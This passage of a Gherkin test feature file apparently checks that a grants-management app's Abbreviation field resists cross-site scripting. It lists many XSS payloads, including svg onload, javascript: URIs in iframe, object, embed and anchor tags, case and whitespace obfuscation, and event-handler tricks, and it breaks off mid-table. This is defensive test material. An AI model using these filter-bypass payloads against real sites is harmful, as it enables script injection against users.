    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                | Field                |
      | <svg onload=alert(1) | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300946 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                    | Field                |
      | <svg onload=alert(1)<!-- | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300947 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                     | Field                |
      | <script>throw[onerror]=[alert],1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300959 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                             | Field                |
      | <script>var{a:onerror}={a:alert};throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300961 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                              | Field                |
      | <script>var{haha:onerror=alert}=0;throw 1</script> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300962 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                         | Field                |
      | <script>window.name='javascript:alert(1)';</script><svg onload=location=name> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300964 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss class=progress-bar-animated onanimationstart=alert(1)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300965 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                                                                                                   | Field                |
      | <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300968 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <iframe src="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300971 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                               | Field                |
      | <object data="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300972 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                             | Field                |
      | <embed src="javascript:alert(1)"> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300973 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <a href="javascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300975 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                 | Field                |
      | <a href="JaVaScript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300976 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <a href=" 	javascript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300982 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                  | Field                |
      | <a href="javas	cript:alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301005 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                   | Field                |
      | <a href="javascript  :alert(1)">XSS</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301009 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                       | Field                |
      | <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301011 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                  | Field                |
